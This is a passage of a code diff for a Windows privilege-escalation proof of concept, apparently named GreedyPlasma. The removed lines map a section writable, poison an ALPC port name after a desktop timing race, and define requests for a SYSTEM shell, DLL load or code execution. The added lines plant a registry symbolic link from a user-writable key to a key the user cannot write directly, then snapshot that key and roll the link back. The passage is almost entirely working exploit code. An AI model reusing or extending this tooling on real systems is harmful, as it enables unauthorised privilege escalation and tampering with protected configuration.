-            wprintf(L"section_reopen_access=unknown\n");
-        }
-
-        candidateView = MapSectionViewWithLabel(candidate, L"section_reopen_map");
-        if (candidateView.writable) {
-            ReleaseSectionView(&run->view);
-            if (run->sectionHandle) {
-                CloseHandle(run->sectionHandle);
-            }
-
-            run->sectionHandle = candidate;
-            run->view = candidateView;
-            run->grantedAccess = granted;
-            wprintf(L"section_refresh=rw desired=0x%08lx handle=0x%p\n", desired, run->sectionHandle);
-            CaptureSectionFingerprint(run);
-            DumpSectionPrefix(&run->view);
-            return true;
-        }
-
-        ReleaseSectionView(&candidateView);
-        CloseHandle(candidate);
-    }
-
-    wprintf(L"section_refresh=ro-only\n");
-    PrintSectionObjectDiagnostics(L"refresh-ro-only", run->sectionHandle);
-    return false;
-}
-
-static bool HasTransitionGate(const GpRunEvidence& evidence)
-{
-    return evidence.desktopTiming.observed || evidence.lockSucceeded;
-}
-
-// ALPC primary-path hypothesis. This records only a controlled path-like mutation.
-static bool ApplyAlpcPathMutation(GpRunEvidence* run, const wchar_t* portName)
-{
-    if (!run) {
-        return false;
-    }
-
-    run->alpc.attempted = true;
-    run->alpc.verified = false;
-
-    if (!HasTransitionGate(*run)) {
-        wprintf(L"alpc=skip timing lock=%u\n", run->lockSucceeded ? 1 : 0);
-        return false;
-    }
-    if (!run->desktopTiming.observed) {
-        wprintf(L"alpc=timing-fallback gate=lock-ok window_ms=%lu\n", run->desktopTiming.elapsedMs);
-    }
-
-    if (!portName || !portName[0] || wcslen(portName) >= MAX_PATH) {
-        wprintf(L"alpc=skip input\n");
-        return false;
-    }
-
-    if (!run->view.base || !run->view.writable || run->view.size < sizeof(GP_CACHE_LAYOUT_HYPOTHESIS)) {
-        wprintf(L"alpc=skip map\n");
-        return false;
-    }
-
-    PGP_CACHE_LAYOUT_HYPOTHESIS layout = (PGP_CACHE_LAYOUT_HYPOTHESIS)run->view.base;
-    run->alpc.oldVersion = layout->Version;
-    run->alpc.oldFlags = layout->Flags;
-
-    layout->Version = 1;
-    layout->Flags |= 0x00000001;
-    wcsncpy_s(layout->AlpcServerPort, MAX_PATH, portName, _TRUNCATE);
-
-    run->alpc.newVersion = layout->Version;
-    run->alpc.newFlags = layout->Flags;
-    run->alpc.verified =
-        layout->Version == 1 &&
-        (layout->Flags & 0x00000001) != 0 &&
-        wcscmp(layout->AlpcServerPort, portName) == 0;
-
-#if GP_VERBOSE_TRACE
-    PrintTimestamp(L"P5");
-    wprintf(
-        L"alpc old_version=0x%08lx new_version=0x%08lx old_flags=0x%08lx new_flags=0x%08lx\n",
-        run->alpc.oldVersion,
-        run->alpc.newVersion,
-        run->alpc.oldFlags,
-        run->alpc.newFlags);
-#endif
+    evidence.admin = QueryAdminMembership(token);
+    evidence.queried = true;
 
     wprintf(
-        L"alpc=write verified=%u gate=%ls window_ms=%lu\n",
-        run->alpc.verified ? 1 : 0,
-        run->desktopTiming.observed ? L"desktop" : L"lock",
-        run->desktopTiming.elapsedMs);
-    return run->alpc.verified;
+        L"start_token user=%ls integrity=%ls rid=0x%08lx elevated=%u elevation_type=%ls admin=%u\n",
+        evidence.sid[0] ? evidence.sid : L"<unknown>",
+        evidence.integrity,
+        evidence.integrityRid,
+        evidence.elevated ? 1 : 0,
+        ElevationTypeName(evidence.elevationType),
+        evidence.admin ? 1 : 0);
+
+    if (sidString) {
+        LocalFree(sidString);
+    }
+    if (integrity) {
+        free(integrity);
+    }
+    if (tokenUser) {
+        free(tokenUser);
+    }
+    if (token) {
+        CloseHandle(token);
+    }
+    return evidence;
 }
 
-// Desktop transition timing oracle based on the original PoC's OpenInputDesktop loop.
-static GpDesktopTimingEvidence WaitForDesktopTransitionWindow(const wchar_t* phase)
-{
-    GpDesktopTimingEvidence timing = { 0 };
-    ULONGLONG start = GetTickCount64();
-
-    while (true) {
-        ULONGLONG now = 0;
-        HDESK dsk = OpenInputDesktop(0, FALSE, GENERIC_ALL);
-
-        timing.polls++;
-        if (!dsk || dsk == INVALID_HANDLE_VALUE) {
-            timing.observed = true;
-            timing.lastError = GetLastError();
-            timing.elapsedMs = (DWORD)(GetTickCount64() - start);
-            wprintf(
-                L"desktop=lost phase=%ls ms=%lu err=0x%08lx polls=%lu\n",
-                phase ? phase : L"<none>",
-                timing.elapsedMs,
-                timing.lastError,
-                timing.polls);
-            return timing;
-        }
-
-        CloseDesktop(dsk);
-
-        now = GetTickCount64();
-        if (now - start >= GP_DESKTOP_TIMEOUT_MS) {
-            timing.timedOut = true;
-            timing.lastError = ERROR_TIMEOUT;
-            timing.elapsedMs = (DWORD)(now - start);
-            wprintf(
-                L"desktop=timeout phase=%ls ms=%lu polls=%lu\n",
-                phase ? phase : L"<none>",
-                timing.elapsedMs,
-                timing.polls);
-            return timing;
-        }
-
-        if ((timing.polls & 0x3f) == 0) {
-            Sleep(1);
-        }
-        else {
-            YieldProcessor();
-        }
-    }
-}
-
-// Placeholder preconditions and blocked sink boundaries.
-static GpStatus PrimitivePrecondition(const GpRunEvidence& evidence)
-{
-    if (!evidence.sectionHandle) {
-        return GpStatus::AccessDenied;
-    }
-    if (!evidence.view.base) {
-        return GpStatus::MapFailed;
-    }
-    return GpStatus::Ok;
-}
-
-static GpStatus AlpcPrecondition(const GpRunEvidence& evidence)
-{
-    GpStatus status = PrimitivePrecondition(evidence);
-    if (status != GpStatus::Ok) {
-        return status;
-    }
-    if (!evidence.registry.succeeded) {
-        return GpStatus::RegistryFailed;
-    }
-    if (!HasTransitionGate(evidence)) {
-        return GpStatus::TimingMiss;
-    }
-    if (!evidence.alpc.verified) {
-        return GpStatus::MutationFailed;
-    }
-    return GpStatus::Ok;
-}
-
-static GpBlockedSinkResult MakeBlockedSinkResult(GpStatus preconditionStatus)
-{
-    GpBlockedSinkResult result = { false, L"blocked-by-design", preconditionStatus };
-    return result;
-}
-
-static GpBlockedSinkResult MakeSkippedSinkResult(const wchar_t* reason)
-{
-    GpBlockedSinkResult result = { false, reason ? reason : L"not-requested", GpStatus::Skipped };
-    return result;
-}
-
-static GpSinkRequest MakeDefaultSinkRequest()
-{
-    GpSinkRequest request = { 0 };
-    request.requestSystemShell = true;
-    request.requestDllLoad = false;
-    request.requestCodeExecution = false;
-    request.alpcPortName = GP_ALPC_PORT_NAME;
-    request.dllPath = NULL;
-    request.entryPoint = NULL;
-    return request;
-}
-
-static bool ParsePointerValue(const wchar_t* text, const void** value)
-{
-    if (!text || !text[0] || !value) {
-        return false;
-    }
-
-    wchar_t* end = NULL;
-    unsigned __int64 parsed = _wcstoui64(text, &end, 0);
-    if (end == text || !end || *end != L'\0' || parsed == 0) {
-        return false;
-    }
-
-    *value = (const void*)(ULONG_PTR)parsed;
-    return true;
-}
-
-static bool ReadNextArg(
-    int argc,
-    wchar_t** argv,
-    int* index,
-    const wchar_t* errorLabel,
-    const wchar_t** value)
+static bool ReadNextArg(int argc, wchar_t** argv, int* index, const wchar_t* label, const wchar_t** value)
 {
     if (!argv || !index || !value || *index + 1 >= argc || !argv[*index + 1] || !argv[*index + 1][0]) {
-        wprintf(L"arg=%ls\n", errorLabel ? errorLabel : L"invalid");
+        wprintf(L"arg=%ls\n", label ? label : L"invalid");
         return false;
     }
-
     ++(*index);
     *value = argv[*index];
     return true;
 }
 
-static bool ParseCommandLineOptions(
-    int argc,
-    wchar_t** argv,
-    const wchar_t** targetName,
-    GpSinkRequest* request)
+static bool IsAbsoluteRegistryPath(const wchar_t* path)
 {
-    bool targetSet = false;
+    if (!path || !path[0]) {
+        return true;
+    }
+    return path[0] == L'\\' ||
+        _wcsnicmp(path, L"HKLM\\", 5) == 0 ||
+        _wcsnicmp(path, L"HKEY_LOCAL_MACHINE\\", 19) == 0 ||
+        _wcsnicmp(path, L"HKCU\\", 5) == 0 ||
+        _wcsnicmp(path, L"HKEY_CURRENT_USER\\", 18) == 0 ||
+        _wcsnicmp(path, L"HKU\\", 4) == 0 ||
+        _wcsnicmp(path, L"HKEY_USERS\\", 11) == 0 ||
+        _wcsnicmp(path, L"\\REGISTRY\\", 10) == 0;
+}
 
-    if (!targetName || !request) {
+static bool SplitRegistrySubKey(const wchar_t* subKey, wchar_t* parent, SIZE_T parentCount)
+{
+    const wchar_t* slash = NULL;
+    SIZE_T parentLen = 0;
+
+    if (!subKey || !subKey[0] || !parent || parentCount == 0) {
         return false;
     }
 
-    *targetName = GP_DEFAULT_TARGET_NAME;
-    *request = MakeDefaultSinkRequest();
+    slash = wcsrchr(subKey, L'\\');
+    if (!slash || slash == subKey) {
+        return false;
+    }
 
-    for (int i = 1; i < argc; ++i) {
-        const wchar_t* arg = argv[i];
-        if (!arg || !arg[0]) {
+    parentLen = (SIZE_T)(slash - subKey);
+    if (parentLen >= parentCount) {
+        return false;
+    }
+
+    wcsncpy_s(parent, parentCount, subKey, parentLen);
+    parent[parentLen] = L'\0';
+    return parent[0] != L'\0';
+}
+
+static bool BuildNativeTarget(const wchar_t* targetSubKey, wchar_t* nativeTarget, SIZE_T nativeTargetCount)
+{
+    wchar_t sid[192] = { 0 };
+
+    if (!targetSubKey || !targetSubKey[0] || !nativeTarget || nativeTargetCount == 0) {
+        return false;
+    }
+    if (!QueryCurrentUserSidString(sid, ARRAYSIZE(sid))) {
+        return false;
+    }
+
+    if (_wcsnicmp(targetSubKey, L"Software\\Classes\\", 17) == 0) {
+        return swprintf_s(nativeTarget, nativeTargetCount, L"\\REGISTRY\\USER\\%ls_Classes\\%ls", sid, targetSubKey + 17) >= 0;
+    }
+    return swprintf_s(nativeTarget, nativeTargetCount, L"\\REGISTRY\\USER\\%ls\\%ls", sid, targetSubKey) >= 0;
+}
+
+static bool ProbeRegistryLink(const wchar_t* subKey, bool* openedWithOpenLinkOption, DWORD* openError, DWORD* valueError)
+{
+    HKEY key = NULL;
+    DWORD type = 0;
+    DWORD bytes = 0;
+    DWORD res = ERROR_SUCCESS;
+    bool isLink = false;
+
+    if (openedWithOpenLinkOption) {
+        *openedWithOpenLinkOption = false;
+    }
+    if (openError) {
+        *openError = ERROR_SUCCESS;
+    }
+    if (valueError) {
+        *valueError = ERROR_SUCCESS;
+    }
+
+    res = RegOpenKeyExW(HKEY_CURRENT_USER, subKey, REG_OPTION_OPEN_LINK, KEY_QUERY_VALUE, &key);
+    if (openError) {
+        *openError = res;
+    }
+    if (res != ERROR_SUCCESS) {
+        if (valueError) {
+            *valueError = res;
+        }
+        return false;
+    }
+    if (openedWithOpenLinkOption) {
+        *openedWithOpenLinkOption = true;
+    }
+
+    res = RegQueryValueExW(key, GP_REG_LINK_VALUE_NAME, NULL, &type, NULL, &bytes);
+    if (valueError) {
+        *valueError = res;
+    }
+    if ((res == ERROR_SUCCESS || res == ERROR_MORE_DATA || res == ERROR_INSUFFICIENT_BUFFER) && type == REG_LINK) {
+        isLink = true;
+    }
+    RegCloseKey(key);
+    return isLink;
+}
+
+static bool DeleteRegistryLinkBySubKey(const wchar_t* subKey, const wchar_t* reason)
+{
+    HKEY key = NULL;
+    DWORD res = ERROR_SUCCESS;
+    NTSTATUS status = STATUS_UNSUCCESSFUL;
+
+    if (!g_NtDeleteKey) {
+        wprintf(L"reg_link_delete=fail reason=%ls target=%ls NT=0x%08lx\n", reason ? reason : L"<none>", subKey, status);
+        return false;
+    }
+
+    res = RegOpenKeyExW(HKEY_CURRENT_USER, subKey, REG_OPTION_OPEN_LINK, DELETE, &key);
+    if (res == ERROR_FILE_NOT_FOUND || res == ERROR_PATH_NOT_FOUND) {
+        return true;
+    }
+    if (res != ERROR_SUCCESS) {
+        wprintf(L"reg_link_delete=fail reason=%ls target=%ls W32=0x%08lx\n", reason ? reason : L"<none>", subKey, res);
+        return false;
+    }
+
+    status = g_NtDeleteKey(key);
+    RegCloseKey(key);
+    wprintf(
+        L"reg_link_delete=%ls reason=%ls target=%ls NT=0x%08lx\n",
+        NT_SUCCESS(status) ? L"ok" : L"fail",
+        reason ? reason : L"<none>",
+        subKey,
+        status);
+    return NT_SUCCESS(status);
+}
+
+static GpTargetBoundary CheckTargetBoundary(const wchar_t* targetSubKey)
+{
+    GpTargetBoundary boundary = { 0 };
+    HKEY key = NULL;
+    wchar_t parent[512] = { 0 };
+
+    boundary.queryError = RegOpenKeyExW(HKEY_CURRENT_USER, targetSubKey, 0, KEY_READ, &key);
+    boundary.query = boundary.queryError == ERROR_SUCCESS;
+    if (key) {
+        RegCloseKey(key);
+        key = NULL;
+    }
+
+    boundary.setValueError = RegOpenKeyExW(HKEY_CURRENT_USER, targetSubKey, 0, KEY_SET_VALUE, &key);
+    boundary.setValue = boundary.setValueError == ERROR_SUCCESS;
+    if (key) {
+        RegCloseKey(key);
+        key = NULL;
+    }
+
+    boundary.writeDacError = RegOpenKeyExW(HKEY_CURRENT_USER, targetSubKey, 0, WRITE_DAC, &key);
+    boundary.writeDac = boundary.writeDacError == ERROR_SUCCESS;
+    if (key) {
+        RegCloseKey(key);
+        key = NULL;
+    }
+
+    boundary.parentQueryError = ERROR_INVALID_PARAMETER;
+    boundary.parentCreateError = ERROR_INVALID_PARAMETER;
+    if (SplitRegistrySubKey(targetSubKey, parent, ARRAYSIZE(parent))) {
+        boundary.parentQueryError = RegOpenKeyExW(HKEY_CURRENT_USER, parent, 0, KEY_READ, &key);
+        boundary.parentQuery = boundary.parentQueryError == ERROR_SUCCESS;
+        if (key) {
+            RegCloseKey(key);
+            key = NULL;
+        }
+        boundary.parentCreateError = RegOpenKeyExW(HKEY_CURRENT_USER, parent, 0, KEY_CREATE_SUB_KEY, &key);
+        boundary.parentCreate = boundary.parentCreateError == ERROR_SUCCESS;
+        if (key) {
+            RegCloseKey(key);
+            key = NULL;
+        }
+    }
+
+    boundary.keep =
+        boundary.query &&
+        !boundary.setValue &&
+        boundary.setValueError == ERROR_ACCESS_DENIED &&
+        !boundary.writeDac &&
+        boundary.writeDacError == ERROR_ACCESS_DENIED &&
+        boundary.parentQuery &&
+        !boundary.parentCreate &&
+        boundary.parentCreateError == ERROR_ACCESS_DENIED;
+
+    boundary.reason = boundary.keep ? L"direct-write-blocked" :
+        (boundary.setValue ? L"direct-user-writable" :
+            (!boundary.query ? L"target-query-failed" :
+                (!boundary.parentQuery ? L"target-parent-query-failed" :
+                    (boundary.parentCreate ? L"target-parent-creatable" : L"target-boundary-failed"))));
+
+    wprintf(
+        L"target_boundary target=%ls query=%u set_value=%u write_dac=%u parent_query=%u parent_create=%u qerr=0x%08lx seterr=0x%08lx dacerr=0x%08lx parent_qerr=0x%08lx parent_createerr=0x%08lx result=%ls reason=%ls\n",
+        targetSubKey,
+        boundary.query ? 1 : 0,
+        boundary.setValue ? 1 : 0,
+        boundary.writeDac ? 1 : 0,
+        boundary.parentQuery ? 1 : 0,
+        boundary.parentCreate ? 1 : 0,
+        boundary.queryError,
+        boundary.setValueError,
+        boundary.writeDacError,
+        boundary.parentQueryError,
+        boundary.parentCreateError,
+        boundary.keep ? L"keep" : L"reject",
+        boundary.reason);
+    return boundary;
+}
+
+static GpSourceControl CheckSourceControl()
+{
+    GpSourceControl control = { 0 };
+    HKEY key = NULL;
+    HKEY parentKey = NULL;
+    wchar_t parent[512] = { 0 };
+
+    control.queryError = RegOpenKeyExW(HKEY_CURRENT_USER, GP_PAINT_HAM_SOURCE, 0, KEY_READ, &key);
+    control.exists = control.queryError == ERROR_SUCCESS;
+    if (key) {
+        RegCloseKey(key);
+        key = NULL;
+    }
+
+    control.isRegLink = ProbeRegistryLink(
+        GP_PAINT_HAM_SOURCE,
+        &control.openWithOpenLinkOption,
+        &control.openLinkError,
+        &control.linkValueError);
+
+    if (control.exists && !control.isRegLink) {
+        control.reason = L"source-existing-normal-key";
+        goto print;
+    }
+    if (control.isRegLink) {
+        control.keep = true;
+        control.reason = L"source-existing-reg-link";
+        goto print;
+    }
+    if (control.queryError != ERROR_FILE_NOT_FOUND && control.queryError != ERROR_PATH_NOT_FOUND) {
+        control.reason = L"source-query-failed";
+        goto print;
+    }
+
+    if (!SplitRegistrySubKey(GP_PAINT_HAM_SOURCE, parent, ARRAYSIZE(parent))) {
+        control.parentError = ERROR_INVALID_PARAMETER;
+        control.reason = L"source-parent-invalid";
+        goto print;
+    }
+
+    control.parentError = RegOpenKeyExW(HKEY_CURRENT_USER, parent, 0, KEY_READ | KEY_CREATE_SUB_KEY, &parentKey);
+    control.parentCreate = control.parentError == ERROR_SUCCESS;
+    if (parentKey) {
+        RegCloseKey(parentKey);
+        parentKey = NULL;
+    }
+    if (control.parentCreate) {
+        control.keep = true;
+        control.reason = L"source-missing";
+    }
+    else if (control.parentError == ERROR_FILE_NOT_FOUND || control.parentError == ERROR_PATH_NOT_FOUND) {
+        control.reason = L"source-parent-missing";
+    }
+    else if (control.parentError == ERROR_ACCESS_DENIED) {
+        control.reason = L"source-parent-not-creatable";
+    }
+    else {
+        control.reason = L"source-parent-open-failed";
+    }
+
+print:
+    if (!control.reason) {
+        control.reason = L"source-control-failed";
+    }
+    wprintf(
+        L"source_control source=%ls exists=%u open_with_open_link_option=%u is_reg_link=%u parent_create=%u result=%ls reason=%ls qerr=0x%08lx link_openerr=0x%08lx link_valueerr=0x%08lx parenterr=0x%08lx\n",
+        GP_PAINT_HAM_SOURCE,
+        control.exists ? 1 : 0,
+        control.openWithOpenLinkOption ? 1 : 0,
+        control.isRegLink ? 1 : 0,
+        control.parentCreate ? 1 : 0,
+        control.keep ? L"keep" : L"reject",
+        control.reason,
+        control.queryError,
+        control.openLinkError,
+        control.linkValueError,
+        control.parentError);
+    return control;
+}
+
+static bool CaptureSnapshot(const wchar_t* targetSubKey, const wchar_t* phase, GpRegistrySnapshot* snapshot)
+{
+    HKEY key = NULL;
+    DWORD res = ERROR_SUCCESS;
+    DWORD subKeys = 0;
+    DWORD values = 0;
+    FILETIME lastWrite = { 0 };
+    ULONGLONG hash = 14695981039346656037ULL;
+
+    if (!snapshot) {
+        return false;
+    }
+    ZeroMemory(snapshot, sizeof(*snapshot));
+    snapshot->hash = hash;
+
+    res = RegOpenKeyExW(HKEY_CURRENT_USER, targetSubKey, 0, KEY_READ, &key);
+    if (res != ERROR_SUCCESS) {
+        snapshot->win32Error = res;
+        wprintf(
+            L"target_registry_snapshot phase=%ls target=%ls query=0 values=0 subkeys=0 mixed_present=0 mixed_type=0 mixed_qword_valid=0 hash=0x%016llx W32=0x%08lx\n",
+            phase ? phase : L"<none>",
+            targetSubKey,
+            (unsigned long long)snapshot->hash,
+            res);
+        return false;
+    }
+
+    snapshot->queried = true;
+    res = RegQueryInfoKeyW(key, NULL, NULL, NULL, &subKeys, NULL, NULL, &values, NULL, NULL, NULL, &lastWrite);
+    if (res != ERROR_SUCCESS) {
+        snapshot->win32Error = res;
+        RegCloseKey(key);
+        return false;
+    }
+
+    snapshot->valueCount = values;
+    snapshot->subKeyCount = subKeys;
+    snapshot->lastWrite = lastWrite;
+
+    Fnv1a64UpdateWide(&hash, targetSubKey);
+    Fnv1a64Update(&hash, &subKeys, sizeof(subKeys));
+    Fnv1a64Update(&hash, &values, sizeof(values));
+    Fnv1a64Update(&hash, &lastWrite, sizeof(lastWrite));
+
+    for (DWORD i = 0; i < values; ++i) {
+        wchar_t valueName[512] = { 0 };
+        BYTE data[GP_MAX_VALUE_BYTES] = { 0 };
+        DWORD valueNameChars = ARRAYSIZE(valueName);
+        DWORD type = 0;
+        DWORD dataBytes = sizeof(data);
+        DWORD enumRes = RegEnumValueW(key, i, valueName, &valueNameChars, NULL, &type, data, &dataBytes);
+
+        if (enumRes == ERROR_MORE_DATA) {
+            dataBytes = 0;
+        }
+        else if (enumRes != ERROR_SUCCESS) {
             continue;
         }
 
-        if (wcscmp(arg, L"--target") == 0) {
-            const wchar_t* value = NULL;
-            if (!ReadNextArg(argc, argv, &i, L"invalid-target", &value)) {
-                return false;
+        Fnv1a64UpdateWide(&hash, valueName);
+        Fnv1a64Update(&hash, &type, sizeof(type));
+        Fnv1a64Update(&hash, &dataBytes, sizeof(dataBytes));
+        Fnv1a64Update(&hash, data, dataBytes);
+
+        if (_wcsicmp(valueName, GP_MIXED_VALUE_NAME) == 0) {
+            snapshot->mixedPresent = true;
+            snapshot->mixedType = type;
+            snapshot->mixedBytes = dataBytes;
+            snapshot->mixedHash = 14695981039346656037ULL;
+            Fnv1a64Update(&snapshot->mixedHash, data, dataBytes);
+            if (type == REG_QWORD && dataBytes >= sizeof(ULONGLONG)) {
+                memcpy(&snapshot->mixedQword, data, sizeof(snapshot->mixedQword));
+                snapshot->mixedQwordValid = true;
             }
-            *targetName = value;
-            targetSet = true;
         }
-        else if (wcscmp(arg, L"--port") == 0) {
-            const wchar_t* value = NULL;
-            if (!ReadNextArg(argc, argv, &i, L"invalid-port", &value)) {
-                return false;
-            }
-            request->alpcPortName = value;
+    }
+
+    snapshot->hash = hash;
+    snapshot->win32Error = ERROR_SUCCESS;
+    RegCloseKey(key);
+
+    wprintf(
+        L"target_registry_snapshot phase=%ls target=%ls query=1 values=%lu subkeys=%lu mixed_present=%u mixed_type=%lu mixed_bytes=%lu mixed_qword_valid=%u mixed_qword=0x%016llx mixed_hash=0x%016llx hash=0x%016llx W32=0x%08lx\n",
+        phase ? phase : L"<none>",
+        targetSubKey,
+        snapshot->valueCount,
+        snapshot->subKeyCount,
+        snapshot->mixedPresent ? 1 : 0,
+        snapshot->mixedType,
+        snapshot->mixedBytes,
+        snapshot->mixedQwordValid ? 1 : 0,
+        (unsigned long long)snapshot->mixedQword,
+        (unsigned long long)snapshot->mixedHash,
+        (unsigned long long)snapshot->hash,
+        snapshot->win32Error);
+    return true;
+}
+
+static bool StageRegistryLink(const wchar_t* targetSubKey, wchar_t* nativeTarget, SIZE_T nativeTargetCount)
+{
+    HKEY key = NULL;
+    DWORD disposition = 0;
+    DWORD res = ERROR_SUCCESS;
+    bool openedWithOpenLinkOption = false;
+    bool isLink = false;
+    DWORD openError = ERROR_SUCCESS;
+    DWORD valueError = ERROR_SUCCESS;
+
+    isLink = ProbeRegistryLink(GP_PAINT_HAM_SOURCE, &openedWithOpenLinkOption, &openError, &valueError);
+    if (isLink && !DeleteRegistryLinkBySubKey(GP_PAINT_HAM_SOURCE, L"stale-pre-stage")) {
+        wprintf(L"reg_link_stage=fail reason=stale-link-delete-failed source=%ls\n", GP_PAINT_HAM_SOURCE);
+        return false;
+    }
+
+    if (!BuildNativeTarget(targetSubKey, nativeTarget, nativeTargetCount)) {
+        wprintf(L"reg_link_stage=fail reason=native-target-build-failed source=%ls target=%ls\n", GP_PAINT_HAM_SOURCE, targetSubKey);
+        return false;
+    }
+
+    res = RegCreateKeyExW(
+        HKEY_CURRENT_USER,
+        GP_PAINT_HAM_SOURCE,
+        0,
+        NULL,
+        REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE,
+        KEY_ALL_ACCESS,
+        NULL,
+        &key,
+        &disposition);
+    if (res != ERROR_SUCCESS) {
+        wprintf(L"reg_link_stage=fail source=%ls W32=0x%08lx\n", GP_PAINT_HAM_SOURCE, res);
+        return false;
+    }
+
+    res = RegSetValueExW(
+        key,
+        GP_REG_LINK_VALUE_NAME,
+        0,
+        REG_LINK,
+        (const BYTE*)nativeTarget,
+        (DWORD)(wcslen(nativeTarget) * sizeof(wchar_t)));
+    if (res != ERROR_SUCCESS) {
+        wprintf(L"reg_link_stage=fail source=%ls value=%ls W32=0x%08lx\n", GP_PAINT_HAM_SOURCE, GP_REG_LINK_VALUE_NAME, res);
+        if (g_NtDeleteKey) {
+            (void)g_NtDeleteKey(key);
         }
-        else if (wcscmp(arg, L"--dll") == 0) {
-            const wchar_t* value = NULL;
-            if (!ReadNextArg(argc, argv, &i, L"invalid-dll", &value)) {
-                return false;
-            }
-            request->dllPath = value;
-            request->requestDllLoad = true;
+        RegCloseKey(key);
+        return false;
+    }
+
+    RegFlushKey(key);
+    RegCloseKey(key);
+    wprintf(L"reglink target=%ls\n", nativeTarget);
+    wprintf(L"reg_link_stage=ok source=%ls target=%ls created=%u\n", GP_PAINT_HAM_SOURCE, nativeTarget, disposition == REG_CREATED_NEW_KEY ? 1 : 0);
+    return true;
+}
+
+static bool CleanupRegistryLink()
+{
+    HKEY key = NULL;
+    bool deleted = DeleteRegistryLinkBySubKey(GP_PAINT_HAM_SOURCE, L"run-cleanup");
+    DWORD res = RegOpenKeyExW(HKEY_CURRENT_USER, GP_PAINT_HAM_SOURCE, 0, KEY_READ, &key);
+    if (key) {
+        RegCloseKey(key);
+    }
+
+    wprintf(
+        L"rollback_verified=%u source=%ls W32=0x%08lx\n",
+        (deleted && (res == ERROR_FILE_NOT_FOUND || res == ERROR_PATH_NOT_FOUND)) ? 1 : 0,
+        GP_PAINT_HAM_SOURCE,
+        res);
+    return deleted && (res == ERROR_FILE_NOT_FOUND || res == ERROR_PATH_NOT_FOUND);
+}
+
+static bool ParseTriggerMode(const wchar_t* value, GpTriggerMode* mode)
+{
+    if (!value || !mode) {
+        return false;
+    }
+    if (_wcsicmp(value, L"none") == 0) {
+        *mode = GpTriggerMode::None;
+        return true;
+    }
+    if (_wcsicmp(value, L"manual") == 0) {
+        *mode = GpTriggerMode::Manual;
+        return true;
+    }
+    return false;
+}
+
+static void PrintUsage()
+{
+    wprintf(L"usage=GreedyPlasma.exe [--paint-ham-poc] [--reg-target <HKCU-relative-target>] [--trigger-mode none|manual] [--observe-ms <ms>] [--settle-ms <ms>] [--hold|--no-hold]\n");
+    wprintf(L"default_source=\"%ls\"\n", GP_PAINT_HAM_SOURCE);
+    wprintf(L"default_target=\"%ls\"\n", GP_DEFAULT_TARGET);
+    wprintf(L"default_trigger=manual default_observe_ms=%lu default_settle_ms=%lu\n", GP_DEFAULT_OBSERVE_MS, GP_DEFAULT_SETTLE_MS);
+}
+
+static bool ParseOptions(int argc, wchar_t** argv, GpRequest* request)
+{
+    if (!request) {
+        return false;
+    }
+
+    request->targetSubKey = GP_DEFAULT_TARGET;
+    request->triggerMode = GpTriggerMode::Manual;
+    request->observeMs = GP_DEFAULT_OBSERVE_MS;
+    request->settleMs = GP_DEFAULT_SETTLE_MS;
+    request->hold = true;
+
+    for (int i = 1; i < argc; ++i) {
+        const wchar_t* arg = argv[i];
+        const wchar_t* value = NULL;
+
+        if (!arg || !arg[0]) {
+            continue;
         }
-        else if (wcscmp(arg, L"--entry") == 0) {
-            const wchar_t* value = NULL;
-            const void* entryPoint = NULL;
-            if (!ReadNextArg(argc, argv, &i, L"invalid-entry", &value)) {
-                return false;
-            }
-            if (!ParsePointerValue(value, &entryPoint)) {
-                wprintf(L"arg=invalid-entry\n");
-                return false;
-            }
-            request->entryPoint = entryPoint;
-            request->requestCodeExecution = true;
+        if (wcscmp(arg, L"--paint-ham-poc") == 0) {
+            continue;
         }
-        else if (wcscmp(arg, L"--shell") == 0) {
-            request->requestSystemShell = true;
-        }
-        else if (wcscmp(arg, L"--no-shell") == 0) {
-            request->requestSystemShell = false;
-        }
-        else if (!targetSet && arg[0] != L'-') {
-            *targetName = arg;
-            targetSet = true;
-        }
-        else {
-            wprintf(L"arg=unknown value=%ls\n", arg);
+        if (wcscmp(arg, L"--help") == 0 || wcscmp(arg, L"-h") == 0 || wcscmp(arg, L"/?") == 0) {
+            PrintUsage();
             return false;
         }
+        if (wcscmp(arg, L"--reg-source") == 0) {
+            wprintf(L"arg=unsupported value=--reg-source reason=source-is-confirmed-and-fixed\n");
+            return false;
+        }
+        if (wcscmp(arg, L"--reg-target") == 0) {
+            if (!ReadNextArg(argc, argv, &i, L"invalid-reg-target", &value)) {
+                return false;
+            }
+            request->targetSubKey = value;
+            continue;
+        }
+        if (wcscmp(arg, L"--trigger-mode") == 0) {
+            if (!ReadNextArg(argc, argv, &i, L"invalid-trigger-mode", &value)) {
+                return false;
+            }
+            if (!ParseTriggerMode(value, &request->triggerMode)) {
+                wprintf(L"arg=invalid-trigger-mode value=%ls allowed=none|manual\n", value);
+                return false;
+            }
+            continue;
+        }
+        if (wcscmp(arg, L"--observe-ms") == 0) {
+            wchar_t* end = NULL;
+            unsigned long parsed = 0;
+            if (!ReadNextArg(argc, argv, &i, L"invalid-observe-ms", &value)) {
+                return false;
+            }
+            parsed = wcstoul(value, &end, 10);
+            if (end == value || !end || *end != L'\0' || parsed == 0 || parsed > GP_MAX_OBSERVE_MS) {
+                wprintf(L"arg=invalid-observe-ms value=%ls max=%lu\n", value, GP_MAX_OBSERVE_MS);
+                return false;
+            }
+            request->observeMs = parsed;
+            continue;
+        }
+        if (wcscmp(arg, L"--settle-ms") == 0) {
+            wchar_t* end = NULL;
+            unsigned long parsed = 0;
+            if (!ReadNextArg(argc, argv, &i, L"invalid-settle-ms", &value)) {
+                return false;
+            }
+            parsed = wcstoul(value, &end, 10);
+            if (end == value || !end || *end != L'\0' || parsed > GP_MAX_SETTLE_MS) {
+                wprintf(L"arg=invalid-settle-ms value=%ls max=%lu\n", value, GP_MAX_SETTLE_MS);
+                return false;
+            }
+            request->settleMs = parsed;
+            continue;
+        }
+        if (wcscmp(arg, L"--hold") == 0) {
+            request->hold = true;
+            continue;
+        }
+        if (wcscmp(arg, L"--no-hold") == 0) {
+            request->hold = false;
+            continue;
+        }
+
+        wprintf(L"arg=unknown value=%ls\n", arg);
+        return false;
     }
 
+    if (IsAbsoluteRegistryPath(request->targetSubKey)) {
+        wprintf(L"arg=invalid-reg-target reason=hkcu-relative-required value=%ls\n", request->targetSubKey ? request->targetSubKey : L"<null>");
+        return false;
+    }
     return true;
 }
 
-static void PrintSinkResult(const wchar_t* name, const GpBlockedSinkResult& result)
+static bool ArmTargetNotify(const wchar_t* targetSubKey, HKEY* notifyKey, HANDLE* notifyEvent, DWORD* notifyError)
 {
+    DWORD res = ERROR_SUCCESS;
+
+    if (notifyKey) {
+        *notifyKey = NULL;
+    }
+    if (notifyEvent) {
